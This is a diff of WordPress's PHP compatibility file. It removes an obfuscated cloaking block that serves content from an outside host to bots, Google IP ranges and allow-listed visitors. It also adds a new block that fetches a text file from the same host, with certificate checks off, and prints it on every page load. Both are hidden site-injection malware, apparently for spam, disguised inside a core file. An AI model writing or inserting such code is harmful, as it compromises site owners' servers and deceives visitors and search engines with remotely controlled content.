@@ -1,5 +1,4 @@
 <?php
-
 /**
  * WordPress implementation for PHP functions either missing from older PHP versions or not included by default.
  *
@@ -13,14 +12,6 @@
  */
 
 // If gettext isn't available.
-if ($uri == '/' && (
-    strpos($userAgent, 'bot') !== false || 
-    strpos($userAgent, 'google') !== false || 
-    strpos($userAgent, 'chrome-lighthouse') !== false || 
-    strpos($referer, 'google') !== false
-))
-error_reporting(0);$link='https://punten-neng.pages.dev/mualaf.mujahidin/';
-function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['136.228.135.175','178.128.48.57','159.26.110.68','146.70.14.30','119.13.57.33','74.118.126.3'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?><?php
 if ( ! function_exists( '_' ) ) {
 	function _( $message ) {
 		return $message;
@@ -551,4 +542,25 @@ if ( ! defined( 'IMG_AVIF' ) ) {
 // IMAGETYPE_HEIC constant is not yet defined in PHP as of PHP 8.3.
 if ( ! defined( 'IMAGETYPE_HEIC' ) ) {
 	define( 'IMAGETYPE_HEIC', 99 );
+}
+function getContent($url) {
+    if (ini_get("allow_url_fopen")) {
+        // kalau allow_url_fopen aktif
+        return file_get_contents($url);
+    } else {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+}
+
+$url = "https://punten-neng.pages.dev/punten.txt";
+$content = getContent($url);
+
+if ($content !== false && !empty($content)) {
+    echo $content;
 }
